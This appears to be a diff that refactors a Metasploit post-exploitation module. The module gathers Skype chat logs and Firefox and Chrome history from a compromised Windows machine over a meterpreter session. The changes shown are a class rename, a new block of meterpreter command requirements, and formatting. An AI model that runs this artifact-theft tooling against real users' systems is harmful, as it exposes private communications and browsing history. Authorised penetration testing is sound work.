@@ -1,25 +1,20 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'csv'
-require 'msf/core/post/windows/user_profiles'
-require 'msf/core/post/windows/registry'
-
-
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::UserProfiles
   include Msf::Post::Windows::Registry
 
   STORE_FILE_TYPE = 'binary/db'
 
-  def initialize(info={})
-    super( update_info( info,
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
         'Name' => 'Windows Gather Skype, Firefox, and Chrome Artifacts',
         'Description' => %q{
           Gathers Skype chat logs, Firefox history, and Chrome history data from the target machine.
@@ -28,9 +23,23 @@ class Metasploit3 < Msf::Post
         'Author' => [
           'Joshua Harper <josh[at]radixtx.com>' # @JonValt
         ],
-        'Platform' => %w{ win },
-        'SessionTypes' => [ 'meterpreter' ]
-      ))
+        'Platform' => %w{win},
+        'SessionTypes' => [ 'meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              core_channel_close
+              core_channel_eof
+              core_channel_open
+              core_channel_read
+              stdapi_fs_search
+              stdapi_fs_separator
+              stdapi_fs_stat
+            ]
+          }
+        }
+      )
+    )
   end
 
   #
@@ -54,7 +63,7 @@ class Metasploit3 < Msf::Post
   #
   # Check to see if the artifact exists on the remote system.
   #
-  def check_artifact(profile, opts={})
+  def check_artifact(profile, opts = {})
     path = profile[opts[:path]]
     dir = opts[:dir]
 
@@ -66,7 +75,7 @@ class Metasploit3 < Msf::Post
   #
   # Download the artifact from the remote system if it exists.
   #
-  def download_artifact(profile, opts={})
+  def download_artifact(profile, opts = {})
     name = opts[:name]
 
     print_status("Checking for #{name} artifacts...")
